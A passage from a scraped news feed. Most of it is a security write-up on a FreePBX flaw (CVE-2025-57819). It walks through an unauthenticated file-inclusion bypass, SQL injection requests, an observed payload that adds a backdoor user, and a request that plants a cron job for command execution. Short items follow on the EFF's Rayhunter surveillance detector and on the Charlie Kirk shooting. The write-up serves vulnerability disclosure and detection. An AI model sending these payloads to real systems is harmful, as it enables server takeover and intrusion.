		}
&lt;/code&gt;
    &lt;p&gt;However, the code block just before caught our eye - if a request comes from localhost then authentication is disregarded as some sort of meaningless annoyance:&lt;/p&gt;
    &lt;code&gt;	// If the request has come from this machine then no need to authenticate.
	$request_from_ip = $_SERVER['REMOTE_ADDR'];
	if (($request_from_ip == '127.0.0.1') || ($request_from_ip == '::1')) {
		$this-&amp;gt;settings['authenticate'] = false;
	}
&lt;/code&gt;
    &lt;p&gt;Taking this as a sign, we followed a hunch and burnt through a lot of time hunting for an SSRF that would allow us to control/send requests from localhost - but no, we are not that lucky.&lt;/p&gt;
    &lt;p&gt;We just wanted to access more intended functionality!&lt;/p&gt;
    &lt;head rend="h3"&gt;A Different Approach!&lt;/head&gt;
    &lt;p&gt;With the pre-auth angle looking like a dead end, we flipped the problem around – could we at least poke the module once authenticated?&lt;/p&gt;
    &lt;p&gt;Even with the code obfuscated, grepping for references to the Endpoint module gave us enough to craft a request. Each time we attempted to probe the module, FreePBX would whine and complain about missing modules - so, doing as we were told, we could just append parameters and provide nonsense values as we went along:&lt;/p&gt;
    &lt;code&gt;GET /admin/ajax.php?command=model&amp;amp;module=endpoint&amp;amp;template=watchTowr1&amp;amp;brand=watchTowr2&amp;amp;model=watchTowr3 HTTP/1.1
Host: {{Hostname}}
Referer: http://{{Hostname}}/admin/config.php
Cookie: PHPSESSID=td3cogljn6ka24glielo37s0uv

&lt;/code&gt;
    &lt;p&gt;Following the clues of the vulnerability summary, we jut threw a few random &lt;code&gt;'&lt;/code&gt; into parameters to see what would happen.&lt;/p&gt;
    &lt;code&gt;GET /admin/ajax.php?command=model&amp;amp;module=endpoint&amp;amp;template=watchTowr1&amp;amp;brand=watchTowr2'&amp;amp;model=watchTowr3 HTTP/1.1
Host: {{Hostname}}
Referer: http://{{Hostname}}/admin/config.php
Cookie: PHPSESSID=td3cogljn6ka24glielo37s0uv

&lt;/code&gt;
    &lt;code&gt;HTTP/1.1 500 Internal Server Error
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: application/json
Content-Length: 400

{"error":{"type":"Exception","message":"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'watchTowr1' AND (`key` LIKE 'watchTowr3%' OR `key` LIKE 'EXP%' )' at line 1::","code":0,"file":"\\/var\\/www\\/html\\/admin\\/libraries\\/utility.functions.php","line":123}}
&lt;/code&gt;
    &lt;quote&gt;Editors note: As FreePBX have told us and thus following the same train of thought, this is intended functionality and at best informational.&lt;/quote&gt;
    &lt;head rend="h3"&gt;Sifting For Gold&lt;/head&gt;
    &lt;p&gt;Briefly perusing logs from our Attacker Eye FreePBX sensor, and filtering out the absolute junk created by AI-generated emoji-drenched ‘PoCs’, we found something interesting:&lt;/p&gt;
    &lt;code&gt;POST /admin/ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.5
Referer: http://{{Hostname}}/admin/config.php
Content-Length: 382

module=%5cFreePBX%5cmodules%5cEndpoint%5cajax&amp;amp;command=model&amp;amp;model=model&amp;amp;template=template&amp;amp;brand=brand'%3bINSERT%20INTO%20ampusers%20(username%2c%20email%2c%20extension%2c%20password_sha1%2c%20extension_low%2c%20extension_high%2c%20deptname%2c%20sections)%20VALUES%20('ampuser'%2c%20''%2c%20''%2c%20'censored'%2c%20''%2c%20''%2c%20''%2c%20'%3bcli')%3b
&lt;/code&gt;
    &lt;p&gt;Carefully, we took that exact request, pointed it at our own lab instance, and – much to our amusement – a shiny new backdoor user named &lt;code&gt;ampuser&lt;/code&gt; popped into existence, lining up perfectly with the IoCs FreePBX community members had already been reporting.&lt;/p&gt;
    &lt;p&gt;
      &lt;del&gt;There it is, the whole exploit chain for installing a backdoor user, instead of our instance RCE.&lt;/del&gt;
    &lt;/p&gt;
    &lt;p&gt;This is a valid payload to exploit the SQL Injection exploitation, notably however without any authentication!&lt;/p&gt;
    &lt;p&gt;How does it work, though? Let’s find out.&lt;/p&gt;
    &lt;head rend="h3"&gt;Reaching Modules Pre-Auth&lt;/head&gt;
    &lt;p&gt;At this stage, we’ve got two critical puzzle pieces:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;We know how to hit the post-auth SQL Injection in the FreePBX Endpoint module.&lt;/item&gt;
      &lt;item&gt;Our honeypot has captured a malicious request that somehow hits &lt;code&gt;/admin/ajax.php&lt;/code&gt;without any authentication.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Sure, we could just glue those together and call it a day – instant exploit chain, done.&lt;/p&gt;
    &lt;p&gt;But that wouldn’t satisfy our curiosity. How on earth does an unauthenticated user manage to reach &lt;code&gt;ajax.php&lt;/code&gt; in the first place?&lt;/p&gt;
    &lt;p&gt;To answer that, we need to rewind and look at the basics. What actually happens when you call:&lt;/p&gt;
    &lt;code&gt;GET /admin/ajax.php?module=somemodule&amp;amp;command=andcommand

&lt;/code&gt;
    &lt;p&gt;Time to dig into &lt;code&gt;/admin/ajax.php&lt;/code&gt; itself and see how requests are handled.&lt;/p&gt;
    &lt;code&gt;/**
 * BMO Ajax handler.
 *
 * Does not support older modules.
 */
if (!isset($_REQUEST['module'])) {
        $module = "framework";
} else {
        $module = $_REQUEST['module'];
}

if (isset($_REQUEST['command'])) {
        $command = $_REQUEST['command'];
} else {
        $command = "unset";
}

//...

$bmo-&amp;gt;Ajax-&amp;gt;doRequest($module, $command); // [1]
&lt;/code&gt;
    &lt;p&gt;At [1], the code takes our supplied &lt;code&gt;module&lt;/code&gt; and &lt;code&gt;command&lt;/code&gt; parameters and hands them off to &lt;code&gt;libraries/BMO/Ajax.class.php&lt;/code&gt;, specifically into its &lt;code&gt;doRequest&lt;/code&gt; method for processing.&lt;/p&gt;
    &lt;code&gt;public function doRequest($module = null, $command = null) {
        if (!$module || !$command) {
                throw new \\Exception("Module or Command were null. Check your code.");
        }

        if (class_exists(ucfirst($module)) &amp;amp;&amp;amp; $module != "directory") {
                throw new \\Exception("The class $module already existed. Ajax MUST load it, for security reasons");
        }

        // Is someone trying to be tricky with filenames?
        if (strpos($module, ".") !== false) {
                throw new \\Exception("Module requested invalid");
        }
        // Is it the hardcoded Framework module?
        if ($module == "framework") { 
                $file = $this-&amp;gt;Config-&amp;gt;get_conf_setting('AMPWEBROOT')."/admin/libraries/BMO/Framework.class.php";
                $ucMod = "Framework"; 
        } elseif ($module == "search") { // Ajax Search plugin
                $file = $this-&amp;gt;Config-&amp;gt;get_conf_setting('AMPWEBROOT')."/admin/libraries/BMO/Search.class.php";
                $ucMod = "Search";
        } else {
                $ucMod = ucfirst($module);
                $ucMod = str_replace("-","dash",$ucMod);
                $file = $this-&amp;gt;Config-&amp;gt;get_conf_setting('AMPWEBROOT')."/admin/modules/$module/$ucMod.class.php";
        }

        // Note, that Self_Helper will throw an exception if the file doesn't exist, or if it does
        // exist but doesn't define the class.
        $this-&amp;gt;injectClass($ucMod, $file); // [1]
        //...
 }
&lt;/code&gt;
    &lt;p&gt;At [1], the &lt;code&gt;doRequest&lt;/code&gt; method calls a helper named &lt;code&gt;injectClass&lt;/code&gt;. This helper dives into reflection logic, attempting to resolve and load the correct class for the requested module.&lt;/p&gt;
    &lt;p&gt;This is where we went nuts, trying to understand the reflection implementation - as always though, it was much simpler than we expected.&lt;/p&gt;
    &lt;p&gt;The vulnerability sits right at the start of &lt;code&gt;doRequest&lt;/code&gt;, in a deceptively simple check.&lt;/p&gt;
    &lt;code&gt;if (class_exists(ucfirst($module)) &amp;amp;&amp;amp; $module != "directory")
&lt;/code&gt;
    &lt;p&gt;This is… not great. The condition just drops the attacker-controlled &lt;code&gt;module&lt;/code&gt; parameter straight into &lt;code&gt;class_exists&lt;/code&gt;. But why does that matter?&lt;/p&gt;
    &lt;p&gt;At first glance, it seems harmless - just a class name lookup. But when we actually checked the PHP documentation, we realized something important: &lt;code&gt;class_exists&lt;/code&gt; doesn’t just take a single argument. It accepts a second argument: &lt;code&gt;autoload&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;If &lt;code&gt;autoload&lt;/code&gt; is &lt;code&gt;true&lt;/code&gt;, PHP will happily try to automatically load whatever class name you feed it. Since the default is &lt;code&gt;true&lt;/code&gt;, our attacker-controlled input into &lt;code&gt;class_exists&lt;/code&gt; means PHP will go looking for a class file on disk.&lt;/p&gt;
    &lt;p&gt;But here’s the twist: we don’t actually care about loading a class. What we really want is for PHP to execute a static script like &lt;code&gt;admin/modules/endpoint/ajax.php&lt;/code&gt;. That’s where FreePBX’s custom magic enters the scene.&lt;/p&gt;
    &lt;p&gt;Inside &lt;code&gt;functions.inc.php&lt;/code&gt; - a helper file loaded early in execution - FreePBX registers its own autoloader:&lt;/p&gt;
    &lt;code&gt;spl_autoload_register('fpbx_framework_autoloader');
&lt;/code&gt;
    &lt;p&gt;According to the official documentation, this function lets you register your own custom handlers for class autoloading. In practice, that means when &lt;code&gt;class_exists&lt;/code&gt; is called, the attacker-supplied &lt;code&gt;module&lt;/code&gt; parameter is handed straight over to the &lt;code&gt;fpbx_framework_autoloader&lt;/code&gt; function.&lt;/p&gt;
    &lt;code&gt;//freepbx autoloader
function fpbx_framework_autoloader($class) {
  if ($class === true) {
          // Deprecated - true USED to mean 'load all modules'
          return false;
  }

  // Handle guielements
  if (substr($class, 0, 3) == 'gui') {
          $class = 'component';
  }

  // FreePBX Module autoloader
  if (stripos($class, 'FreePBX\\\\modules\\\\') === 0) { // [1]
          // Trim the front
          $req = substr($class, 16); // [2]
          
          // If there's ANOTHER slash in the request, we want to try to autoload
          // the file.
          $modarr = explode('\\\\', $req); // [3]
          if (!isset($modarr[1])) {
                  // TODO: Add *real* module autoloader here in FreePBX 15, replacing the BMO __get() autoloader
                  return;
          }
          // This is a basic implementation of PSR4 under ..admin/modules/modulename/.. so that
          // a request for \\FreePBX\\modules\\Ucp\\Widgets\\Ponies would look for a file
          // called ..admin/modules/ucp/Widgets/Ponies.php and then load it, if it exists.
          $moddir = \\FreePBX::Config()-&amp;gt;get('AMPWEBROOT')."/admin/modules/".strtolower(array_shift($modarr))."/"; // [4]

          $filepath = $moddir.join("/", $modarr).".php"; // [5]

          if (file_exists($filepath)) {
                  include $filepath; // [6]
          }
          // Always return here, as there's nothing left to try.
          return;
  }
  //...
}
				
&lt;/code&gt;
    &lt;p&gt;Let’s say we specify &lt;code&gt;module&lt;/code&gt; as &lt;code&gt;FreePBX\\modules\\endpoint\\install&lt;/code&gt;.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;At &lt;code&gt;[1]&lt;/code&gt;, the code checks if our&lt;code&gt;module&lt;/code&gt;starts with&lt;code&gt;FreePBX\\modules&lt;/code&gt;. If it does, we move into the interesting path.&lt;/item&gt;
      &lt;item&gt;At &lt;code&gt;[2]&lt;/code&gt;, it strips away the&lt;code&gt;FreePBX\\modules&lt;/code&gt;prefix, leaving just&lt;code&gt;endpoint\\install&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;At &lt;code&gt;[3]&lt;/code&gt;, the string is split into an array (&lt;code&gt;modarr&lt;/code&gt;) using the backslash separator.&lt;/item&gt;
      &lt;item&gt;At &lt;code&gt;[4]&lt;/code&gt;, it builds a path to the webroot and tacks on the first element of that array. In a default FreePBX setup, this gives&lt;code&gt;/var/www/html/admin/modules/endpoint/&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;At &lt;code&gt;[5]&lt;/code&gt;, it takes the last element from the array (&lt;code&gt;install&lt;/code&gt;) and adds&lt;code&gt;.php&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;In our case, the &lt;code&gt;filepath&lt;/code&gt;is now equal to:&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;
      &lt;code&gt;/var/www/html/admin/modules/endpoint/install.php&lt;/code&gt;
    &lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Everything becomes clear at &lt;code&gt;[6]&lt;/code&gt;, where our file… is just included.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is it! The custom FreePBX class loader allows you to include any file ending with the &lt;code&gt;.php&lt;/code&gt; extension from the &lt;code&gt;admin/modules&lt;/code&gt; location!&lt;/p&gt;
    &lt;p&gt;Put simply: attackers can hit certain module files directly without needing to authenticate.&lt;/p&gt;
    &lt;quote&gt;Additional note. You can only reach files ending with&lt;code&gt;.php&lt;/code&gt;, like&lt;code&gt;ajax.php&lt;/code&gt;. You are not able to include files with additional dots, like&lt;code&gt;Endpoint.class.php&lt;/code&gt;. This is because an additional filtering exists and&lt;code&gt;module&lt;/code&gt;parameter cannot contain a dot character.&lt;/quote&gt;
    &lt;p&gt;So, let’s put it to the test. If we try to reach the &lt;code&gt;install.php&lt;/code&gt; file from the Endpoint module pre-auth, we can send a request like this:&lt;/p&gt;
    &lt;code&gt;GET /admin/ajax.php?module=FreePBX\\modules\\Endpoint\\install&amp;amp;command=watchTowr HTTP/1.1
Host: freepbx.lab
&lt;/code&gt;
    &lt;p&gt;And, as expected, we get an error - proving that we have reached our target code path:&lt;/p&gt;
    &lt;code&gt;HTTP/1.0 500 Internal Server Error
...

{"error":{"type":"Whoops\\\\Exception\\\\ErrorException","message":"Cannot redeclare getdefaultaddress()","code":1,"file":"\\/var\\/www\\/html\\/admin\\/modules\\/endpoint\\/install.php","line":4280}}
&lt;/code&gt;
    &lt;p&gt;Finally, we can just use this to exploit the SQL Injection that we saw in-the-wild:&lt;/p&gt;
    &lt;code&gt;GET /admin/ajax.php?module=FreePBX\\modules\\endpoint\\ajax&amp;amp;command=model&amp;amp;model=model&amp;amp;template=template&amp;amp;brand=brand' HTTP/1.1
Host: freepbx.lab

&lt;/code&gt;
    &lt;p&gt;And, again, as expected the response proving we can hit the vulnerable code:&lt;/p&gt;
    &lt;code&gt;HTTP/1.1 500 Internal Server Error
...

{"error":{"type":"Exception","message":"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'template' AND (`key` LIKE 'model%' OR `key` LIKE 'EXP%' )' at line 1::","code":0,"file":"\\/var\\/www\\/html\\/admin\\/libraries\\/utility.functions.php","line":123}}
&lt;/code&gt;
    &lt;p&gt;And that’s the punchline. A couple of takeaways here:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The official patch focuses narrowly on fixing the SQL Injection in the Endpoint module.&lt;/item&gt;
      &lt;item&gt;But the bigger issue – this “authentication bypass” quirk that lets you include &lt;code&gt;.php&lt;/code&gt;files pre-auth – sits in the core FreePBX code untouched.&lt;/item&gt;
      &lt;item&gt;Which means even fully patched systems still expose a juicy attack surface: attackers can directly hit certain module &lt;code&gt;.php&lt;/code&gt;files without logging in.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Not exactly the root-cause fix we’d hope for. More like a band-aid over a leaky pipe.&lt;/p&gt;
    &lt;p&gt;But maybe that’s what the FreePBX intended?&lt;/p&gt;
    &lt;head rend="h3"&gt;SQL Injection to Remote Code Execution&lt;/head&gt;
    &lt;p&gt;Listening to words of wisdom, we set out to turn this shiny SQL Injection into full-blown RCE. Honestly, it felt less like an epic boss battle and more like a side quest - “deliver this item to your friend across town.”&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Check what the database user (&lt;code&gt;asterisk&lt;/code&gt;) can actually do.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Could it upload files, run dangerous MySQL commands, or otherwise make our lives easy? Sadly no – some hardening had been applied, so privileges were limited.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Poke through the existing tables for something useful.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;And that’s when we spotted it – a table that practically waved at us and whispered: “exploit me.”&lt;/p&gt;
    &lt;p&gt;Tables called &lt;code&gt;cron_jobs&lt;/code&gt; always sound fun:&lt;/p&gt;
    &lt;p&gt;And honestly, it doesn’t get much simpler than this.&lt;/p&gt;
    &lt;p&gt;All we need to do is drop a new row into the &lt;code&gt;cron_jobs&lt;/code&gt; table. We set the &lt;code&gt;command&lt;/code&gt; field to whatever payload we want executed, and give &lt;code&gt;schedule&lt;/code&gt; the good old &lt;code&gt;* * * * *&lt;/code&gt; treatment so it runs every minute.&lt;/p&gt;
    &lt;p&gt;The final request ends up looking like this:&lt;/p&gt;
    &lt;code&gt;GET /admin/ajax.php?module=FreePBX\\modules\\endpoint\\ajax&amp;amp;command=model&amp;amp;template=x&amp;amp;model=model&amp;amp;brand=x'+;INSERT+INTO+cron_jobs+(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)+VALUES+('sysadmin','watchTowr','id+&amp;gt;+/tmp/watchTowr',NULL,'*+*+*+*+*',30,1,1)+--+ HTTP/1.1
Host: freepbx.lab

&lt;/code&gt;
    &lt;p&gt;After a while, we can see our command executed and the entire chain is completed.&lt;/p&gt;
    &lt;head rend="h3"&gt;Detection Artefact Generator&lt;/head&gt;
    &lt;p&gt;Today, we are publishing our Detection Artefact Generator which you can find here.&lt;/p&gt;
    &lt;p&gt;This DAG attempts to create a new row within the &lt;code&gt;cron_jobs&lt;/code&gt; table, triggering the writing of a webshell:&lt;/p&gt;
    &lt;p&gt;If this fails, the DAG adds a new user:&lt;/p&gt;
    &lt;p&gt;Maybe this was all intended functionality?&lt;/p&gt;
    &lt;p&gt;The research published by watchTowr Labs is just a glimpse into what powers the watchTowr Platform – delivering automated, continuous testing against real attacker behaviour.&lt;/p&gt;
    &lt;p&gt;By combining Proactive Threat Intelligence and External Attack Surface Management into a single Preemptive Exposure Management capability, the watchTowr Platform helps organisations rapidly react to emerging threats – and gives them what matters most: time to respond.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://labs.watchtowr.com/you-already-have-our-personal-data-take-our-phone-calls-too-freepbx-cve-2025-57819/"/></entry><entry><id>https://news.ycombinator.com/item?id=45201703</id><title>Show HN: Haystack – Review pull requests like you wrote them yourself</title><updated>2025-09-10T20:36:51.685314+00:00</updated><link href="https://haystackeditor.com"/></entry><entry><id>https://news.ycombinator.com/item?id=45201988</id><title>Rayhunter: IMSI Catchers We Have Found So Far</title><updated>2025-09-10T20:36:51.366949+00:00</updated><content>&lt;doc fingerprint="ec0281b6899d9227"&gt;
  &lt;main&gt;
    &lt;p&gt;A little over a year ago we released Rayhunter, our open source tool designed to detect cell-site simulators. We’ve been blown away by the level of community engagement on this project. It has been installed on thousands of devices (or so we estimate, we don’t actually know since Rayhunter doesn’t have any telemetry!). We have received dozens of packet captures, hundreds of improvements, both minor and major, documentation fixes, and bug reports from our open source community. This project is a testament to the power and impact of open source and community driven counter-surveillance.&lt;/p&gt;
    &lt;p&gt;If this is your first time hearing about Rayhunter, you can read our announcement blog post here. Or if you prefer, you can watch our DEF CON talk. In short, Rayhunter is an open source Linux program that runs on a variety of mobile hotspots (dedicated devices that use a cellular connection to give you Wi-Fi). Rayhunter’s job is to look for cell-site simulators (CSS), a tool police use to locate or identify people's cell phones, also known as IMSI catchers or Stingrays. Rayhunter analyzes the “handshakes” between your Rayhunter device and the cell towers it is connected to for behaviors consistent with that of a CSS. When it finds potential evidence of a CSS it alerts the user with an indicator on the screen and potentially a push notification to their phone.&lt;/p&gt;
    &lt;p&gt;Understanding if CSS are being used to spy on protests is one of the main goals of the Rayhunter project. Thanks to members of our community bringing Rayhunter to dozens of protests, we are starting to get a picture of how CSS are currently being used in the US. So far Rayhunter has not turned up any evidence of cell-site simulators being used to spy on protests in the US — though we have found them in use elsewhere.&lt;/p&gt;
    &lt;p&gt;So far Rayhunter has not turned up any evidence of cell-site simulators being used to spy on protests in the US.&lt;/p&gt;
    &lt;p&gt;There are a couple of caveats here. First, it’s often impossible to prove a negative. Maybe Rayhunter just hasn’t been at protests where CSS have been present. Maybe our detection signatures aren’t picking up the techniques used by US law enforcement. But we’ve received reports from a lot of protests, including pro-Palestine protests, protests in Washington DC and Los Angeles, as well as the ‘No Kings’ and ‘50501’ protests all over the country. So far, we haven’t seen evidence of CSS use at any of them.&lt;/p&gt;
    &lt;p&gt;A big part of the reason for the lack of CSS at protests could be that some courts have required a warrant for their use, and even law enforcement agencies not bound by these rulings have policies that require police to get a warrant. CSS are also costly to buy and use, requiring trained personnel to use nearly one million dollars worth of equipment.&lt;/p&gt;
    &lt;p&gt;The fact is police also have potentially easier to use tools available. If the goal of using a CSS at a protest is to find out who was at the protest, police could use tools such as:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;License plate readers to track the vehicles arriving and leaving at the protest.&lt;/item&gt;
      &lt;item&gt;Location data brokers, such as Locate X and Fog Data Science, to track the phones of protestors by their mobile advertising IDs (MAID).&lt;/item&gt;
      &lt;item&gt;Cellebrite and other forensic extraction tools to download all the data from phones of arrested protestors if they are able to unlock those phones.&lt;/item&gt;
      &lt;item&gt;Geofence warrants, which require internet companies like Google to disclose the identifiers of devices within a given location at a given time.&lt;/item&gt;
      &lt;item&gt;Facial recognition such as Clearview AI to identify all present via public or private databases of peoples faces.&lt;/item&gt;
      &lt;item&gt;Tower dumps from phone companies, which, similar to geofence warrants, require phone companies to turn over a list of all the phones connected to a certain tower at a certain time.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We think, due to the lack of evidence of CSS being used, protestors can worry less about CSS and more about these other techniques. Luckily, the actions one should take to protect themselves are largely the same:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;To protect yourself against Locate X and Fog you can turn off location services on your phone (iPhone and Android).&lt;/item&gt;
      &lt;item&gt;To protect yourself from Cellebrite you can use a strong password, turn off biometric unlocks, and keep your phone up to date.&lt;/item&gt;
      &lt;item&gt;To protect against facial recognition, you can wear a mask.&lt;/item&gt;
      &lt;item&gt;To protect against tower dumps put your phone into airplane mode (though especially high risk individuals may want to use a Faraday bag instead).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We feel pretty good about Rayhunter’s detection engine, though there could still be things we are missing. Some of our confidence in Rayhunter’s detection engine comes from the research we have done into how CSS work. But the majority of our confidence comes from testing Rayhunter against a commercial cell-site simulator thanks to our friends at Cape. Rayhunter detected every attack run by the commercial CSS.&lt;/p&gt;
    &lt;head rend="h2"&gt;Where Rayhunter Has Detected Likely Surveillance&lt;/head&gt;
    &lt;p&gt;Rayhunter users have found potential evidence of CSS being used in the wild, though not at protests. One of the most interesting examples that triggered multiple detections and even inspired us to write some new detection rules was at a cruise port in the Turks and Caicos Islands. The person who captured this data put the packet captures online for other researchers to review.&lt;/p&gt;
    &lt;p&gt;Rayhunter users have detected likely CSS use in the US as well. We have received reports from Chicago and New York where our “IMSI Sent without authentication” signature was triggered multiple times over the course of a couple hours and then stopped. Neither report was in the vicinity of a protest. We feel fairly confident that these reports are indicative of a CSS being present, though we don’t have any secondary evidence to back them up.&lt;/p&gt;
    &lt;p&gt;We have received other reports that have triggered our CSS detection signatures, but the above examples are the ones we feel most confident about.&lt;/p&gt;
    &lt;p&gt;We encourage people to keep using Rayhunter and continue bringing it to protests. Law enforcement trends can change over time and it is possible that some cities are using them more often than others (for example Fontana, California reportedly used their CSS over 300 times in two years). We also know that ICE still uses CSS and has recently renewed their contracts. Interestingly, in January, the FBI requested a warrant from the Foreign Intelligence Surveillance Court to use what was likely a CSS and was rejected. This was the first time the FBI has sought a warrant to use a CSS using the Foreign Intelligence Surveillance Act since 2015, when the Justice Department began requiring a warrant for their use. If police start using CSS to spy on protests we want to know.&lt;/p&gt;
    &lt;p&gt;There is still a lot we want to accomplish with Rayhunter, we have some future plans for the project that we are very excited to share with you in the near future, but the biggest thing we need right now is more testing outside of the United States.&lt;/p&gt;
    &lt;head rend="h2"&gt;Taking Rayhunter International&lt;/head&gt;
    &lt;p&gt;We are interested in getting Rayhunter data from every country to help us understand the global use of CSS and to refine our signatures. Just because CSS don't appear to be used to spy on protests in the US right now doesn't mean that is true everywhere. We have also seen that some signatures that work in the US are prone to false positives elsewhere (such as our 2G signature in countries that still have active 2G networks). The first device supported by Rayhunter, the Orbic hotspot, was US only, so we have very little international data. But we now have support for multiple devices! If you are interested in Rayhunter, but can’t find a device that works in your country, let us know. We recommend you consult with an attorney in your country to determine whether running Rayhunter is likely to be legally risky or outlawed in your jurisdiction.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.eff.org/deeplinks/2025/09/rayhunter-what-we-have-found-so-far"/></entry><entry><id>https://news.ycombinator.com/item?id=45202200</id><title>Charlie Kirk shot at event in Utah</title><updated>2025-09-10T20:36:50.768809+00:00</updated><content>&lt;doc fingerprint="3238d31ca981c49c"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;What we know&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Right-wing political activist Charlie Kirk was shot at an event he was hosting at Utah Valley University in Orem, just north of Provo.&lt;/item&gt;
      &lt;item&gt;Kirk was removed from the premises by his security team, the school said.&lt;/item&gt;
      &lt;item&gt;Videos circulating online show Kirk recoiling after a shot was heard, with blood pouring from his neck.&lt;/item&gt;
      &lt;item&gt;A university spokesperson said they do not have a suspect in custody. The school previously said in an alert that police had a suspect detained.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;No suspect in custody, university says&lt;/head&gt;
    &lt;p&gt;Authorities do not have a suspect in custody, according to Utah Valley University spokesperson Ellen Treanor.&lt;/p&gt;
    &lt;p&gt;The school had said earlier in an alert that police had detained a suspect.&lt;/p&gt;
    &lt;head rend="h2"&gt;No security to get into Kirk's event, bystander says&lt;/head&gt;
    &lt;p&gt;Despite the large crowd Kirk drew to Utah Valley University, witness Tyler McGettigan said he was surprised that he didn't have to pass any security to get in.&lt;/p&gt;
    &lt;p&gt;The event required a ticket with a scannable code, which McGettigan told NBC News that he printed out and brought with him. But he said that he didn't need it to get into the amphitheater where Kirk was speaking.&lt;/p&gt;
    &lt;p&gt;"I was expecting when I got here that I'd have to pass through some kind of security, but that just wasn't a thing," McGettigan said. "No one checked the barcode or the QR code. There was no checkpoint to get in. It was literally, anyone could walk in if they wanted."&lt;/p&gt;
    &lt;head rend="h2"&gt;Suspect shot Kirk from nearby building, university says&lt;/head&gt;
    &lt;p&gt;A spokesperson for Utah Valley University said in a statement that the suspect shot Kirk from the university's Losee Center, roughly 200 feet away from where he was sitting.&lt;/p&gt;
    &lt;p&gt;The suspect, who has been taken into custody, is not a student, the spokesperson added.&lt;/p&gt;
    &lt;head rend="h2"&gt;Vance shares photo with Kirk&lt;/head&gt;
    &lt;p&gt;Vice President JD Vance shared a photo of him with Charlie Kirk, as well as Donald Trump Jr. and political aide Andy Surabian, as he asked for prayers for Kirk after he was shot.&lt;/p&gt;
    &lt;p&gt;Kirk is a well-known conservative activist who is close with key members of President Trump's political operation, including Vance and Donald Trump Jr. And Kirk helped push for Vance to be chosen as Trump's running mate, NBC News reported at the time.&lt;/p&gt;
    &lt;head rend="h2"&gt;Utah Valley University cancels classes, tells people to leave campus&lt;/head&gt;
    &lt;p&gt;Campus is closed and classes are canceled until further notice at Utah Valley University.&lt;/p&gt;
    &lt;p&gt;The school urged everyone to leave campus immediately in a post on X following the shooting.&lt;/p&gt;
    &lt;head rend="h2"&gt;Kirk is shot and hospitalized, Turning Point USA says&lt;/head&gt;
    &lt;p&gt;A spokesperson for Turning Point USA confirmed to NBC News that Kirk has been shot.&lt;/p&gt;
    &lt;p&gt;"He is in the hospital, and we are praying for him at this time," the organization said.&lt;/p&gt;
    &lt;head rend="h2"&gt;Witness describes a loud shot and 'a bunch of blood'&lt;/head&gt;
    &lt;p&gt;Justin Hickens, who said he was about 20 yards from the shooting, told NBC News’ Tom Llamas that he saw Kirk get hit after a gunshot rang out during the event at Utah Valley University.&lt;/p&gt;
    &lt;p&gt;“We heard a big loud shot, I saw a bunch of blood come out of Charlie, I saw his body kind of kick back and go limp, and everybody dropped to the ground,” Hickens said.&lt;/p&gt;
    &lt;p&gt;After a few moments, people started running out of the outdoor pavilion area, knocking over barricades. Hickens said he slowed down once he realized there were no more shots being fired and he felt safe.&lt;/p&gt;
    &lt;p&gt;"I kind of turned around and all of a sudden I saw officers walking with this very elderly gentleman with white hair," Hickens said. "They had him arrested, they had him on his knees and he was screaming about his rights and all that stuff. They cuffed him and put him away."&lt;/p&gt;
    &lt;p&gt;There was no metal detectors to get into the event, Hickens said, though there was security by Kirk himself.&lt;/p&gt;
    &lt;head rend="h2"&gt;Trump has often complimented, appeared with Kirk&lt;/head&gt;
    &lt;p&gt;President Donald Trump has often spoken favorably about Kirk, including multiple times on the campaign trail last year.&lt;/p&gt;
    &lt;p&gt;During a rally in Washington the day before he was sworn in to a second term in January, Trump told attendees: "Charlie Kirk is here. And I want to thank Charlie. Charlie is fantastic. I mean, this guy."&lt;/p&gt;
    &lt;p&gt;A few weeks before, during a rally in Las Vegas on Dec. 22, 2024, Trump called Kirk "incredible," adding that he "is a special talent, and he’s out there fighting."&lt;/p&gt;
    &lt;p&gt;The president, then a candidate for the White House, also appeared last October at a Turning Point USA political rally in Phoenix.&lt;/p&gt;
    &lt;p&gt;"I want to express my tremendous gratitude to Charlie Kirk. He’s really an amazing guy. Amazing guy," Trump said.&lt;/p&gt;
    &lt;p&gt;The president, on the campaign trail last June, also lauded Kirk at a Turning Point Action town hall in Phoenix, saying, "I want to thank a special person, Charlie Kirk, for his tremendous leadership."&lt;/p&gt;
    &lt;head rend="h2"&gt;Who is Charlie Kirk: A prominent young conservative activist&lt;/head&gt;
